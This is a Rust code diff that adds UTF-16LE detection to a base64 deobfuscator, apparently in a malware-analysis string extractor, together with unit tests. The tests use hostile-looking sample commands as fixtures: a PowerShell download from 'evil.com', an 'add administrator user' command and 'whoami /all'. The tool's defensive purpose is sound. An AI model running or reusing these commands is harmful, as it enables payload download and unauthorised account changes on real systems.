@@ -36,14 +36,56 @@ fn decoded_to_text(decoded: Vec<u8>) -> Option<String> {
     if decoded.len() > MAX_DECODED_SIZE {
         return None;
     }
+    // Clean ASCII text (tabs/newlines allowed) is valid UTF-8 as-is.
     if decoded
         .iter()
         .all(|&b| b.is_ascii() && (!b.is_ascii_control() || b == b'\n' || b == b'\r' || b == b'\t'))
     {
-        String::from_utf8(decoded).ok()
-    } else {
-        std::str::from_utf8(&decoded).ok().map(str::to_string)
+        return String::from_utf8(decoded).ok();
     }
+    // Windows payloads are frequently encoded as little-endian UTF-16 — most
+    // notably `powershell -EncodedCommand`, but the same wide-char form shows up
+    // in registry blobs, .lnk files, and obfuscated scripts of every filetype.
+    // Such bytes are *technically* valid UTF-8 (interleaved NULs are valid
+    // single-byte UTF-8), so we must test for the wide-char form before falling
+    // back to a plain UTF-8 decode that would yield a NUL-filled string.
+    if let Some(s) = decode_utf16le(&decoded) {
+        return Some(s);
+    }
+    std::str::from_utf8(&decoded).ok().map(str::to_string)
+}
+
+/// Cheap test for the little-endian UTF-16 wide-text signature: an even length
+/// and a clear majority of zero high bytes — the shape of wide-encoded Latin
+/// text such as Windows commands, paths, and URLs. Random binary has a ~0.4%
+/// chance per code unit of a zero high byte, so this reliably rejects it.
+fn looks_like_utf16le(bytes: &[u8]) -> bool {
+    bytes.len() >= 4
+        && bytes.len().is_multiple_of(2)
+        && bytes.chunks_exact(2).filter(|c| c[1] == 0).count() * 2 >= bytes.len() / 2
+}
+
+/// Decode bytes as little-endian UTF-16, but only when they actually look like
+/// wide text (see [`looks_like_utf16le`]); arbitrary binary must not be coerced
+/// into Unicode.
+fn decode_utf16le(bytes: &[u8]) -> Option<String> {
+    if !looks_like_utf16le(bytes) {
+        return None;
+    }
+    let code_units: Vec<u16> = bytes
+        .chunks_exact(2)
+        .map(|c| u16::from_le_bytes([c[0], c[1]]))
+        .collect();
+    let decoded = String::from_utf16(&code_units).ok()?;
+    // Drop a leading byte-order mark and reject control-heavy results that
+    // slipped past the heuristic.
+    let s = decoded.trim_start_matches('\u{feff}');
+    if s.chars()
+        .any(|c| c.is_control() && !matches!(c, '\n' | '\r' | '\t'))
+    {
+        return None;
+    }
+    Some(s.to_string())
 }
 
 /// Deobfuscate strings that use concatenation patterns.
@@ -123,8 +165,8 @@ pub(crate) fn extract_embedded_base64(strings: &[ExtractedString]) -> Vec<Extrac
                         continue;
                     }
 
-                    // Validate it's printable text
-                    if let Ok(decoded_str) = String::from_utf8(decoded) {
+                    // Validate it's printable text (UTF-8 or wide UTF-16LE).
+                    if let Some(decoded_str) = decoded_to_text(decoded) {
                         let trimmed = decoded_str.trim();
 
                         // Must be meaningful (at least 4 chars after trim)
@@ -197,6 +239,11 @@ fn decode_base64_string(s: &ExtractedString) -> Option<ExtractedString> {
     let decoded =
         base64::Engine::decode(&base64::engine::general_purpose::STANDARD, s.value.trim()).ok()?;
 
+    // Wide (UTF-16LE) payloads are validated strictly during decoding, and their
+    // base64 is artificially 'A'-heavy (from interleaved NULs), which would fool
+    // the quality heuristic below — so note it before the bytes are consumed.
+    let is_wide = looks_like_utf16le(&decoded);
+
     let decoded_str = decoded_to_text(decoded)?;
 
     // Reject if decoded string is too short or just whitespace
@@ -206,11 +253,14 @@ fn decode_base64_string(s: &ExtractedString) -> Option<ExtractedString> {
     }
 
     // Reject if input is more text-like than output (false positive detection)
-    // e.g., "IWorkItemQueriesExt2" decoding to binary garbage
-    let input_quality = string_quality_score(&s.value);
-    let output_quality = string_quality_score(&decoded_str);
-    if input_quality > output_quality {
-        return None;
+    // e.g., "IWorkItemQueriesExt2" decoding to binary garbage. Skipped for wide
+    // text, which the UTF-16LE decoder has already validated as clean.
+    if !is_wide {
+        let input_quality = string_quality_score(&s.value);
+        let output_quality = string_quality_score(&decoded_str);
+        if input_quality > output_quality {
+            return None;
+        }
     }
 
     // Classify before moving
@@ -868,6 +918,59 @@ mod tests {
         let result = decode_base64_string(&input).unwrap();
         assert_eq!(result.value, "Hello World!");
         assert_eq!(result.method, StringMethod::Base64Decode);
+    }
+
+    /// Encode an ASCII string as little-endian UTF-16 (the Windows wide-char form).
+    fn utf16le(s: &str) -> Vec<u8> {
+        s.encode_utf16().flat_map(u16::to_le_bytes).collect()
+    }
+
+    #[test]
+    fn test_decode_utf16le_ascii() {
+        assert_eq!(
+            decode_utf16le(&utf16le("whoami /all")).as_deref(),
+            Some("whoami /all")
+        );
+    }
+
+    #[test]
+    fn test_decode_utf16le_strips_bom() {
+        let mut bytes = vec![0xFF, 0xFE]; // UTF-16LE BOM
+        bytes.extend(utf16le("Get-Process"));
+        assert_eq!(decode_utf16le(&bytes).as_deref(), Some("Get-Process"));
+    }
+
+    #[test]
+    fn test_decode_utf16le_rejects_binary() {
+        // Arbitrary binary should not be coerced into wide text.
+        let binary = [0x4d, 0x5a, 0x90, 0x00, 0x03, 0x00, 0x00, 0x00];
+        assert_eq!(decode_utf16le(&binary), None);
+    }
+
+    #[test]
+    fn test_decode_utf16le_rejects_odd_length() {
+        assert_eq!(decode_utf16le(&[0x48, 0x00, 0x65]), None);
+    }
+
+    #[test]
+    fn test_base64_decode_utf16le() {
+        // The canonical Windows form: base64 over little-endian UTF-16, like the
+        // payload of `powershell -EncodedCommand`, embedded in any filetype.
+        let wide = utf16le("Invoke-WebRequest http://evil.com/x.exe");
+        let b64 = base64::Engine::encode(&base64::engine::general_purpose::STANDARD, &wide);
+        let result = decode_base64_string(&make_string(&b64, Some(StringKind::Base64)))
+            .expect("base64-over-utf16le should decode");
+        assert_eq!(result.value, "Invoke-WebRequest http://evil.com/x.exe");
+        assert_eq!(result.method, StringMethod::Base64Decode);
+    }
+
+    #[test]
+    fn test_decode_base64_strings_utf16le_batch() {
+        let wide = utf16le("net user administrator P@ssw0rd /add");
+        let b64 = base64::Engine::encode(&base64::engine::general_purpose::STANDARD, &wide);
+        let results = decode_base64_strings(&[make_string(&b64, Some(StringKind::Base64))]);
+        assert_eq!(results.len(), 1);
+        assert_eq!(results[0].value, "net user administrator P@ssw0rd /add");
     }
 
     #[test]
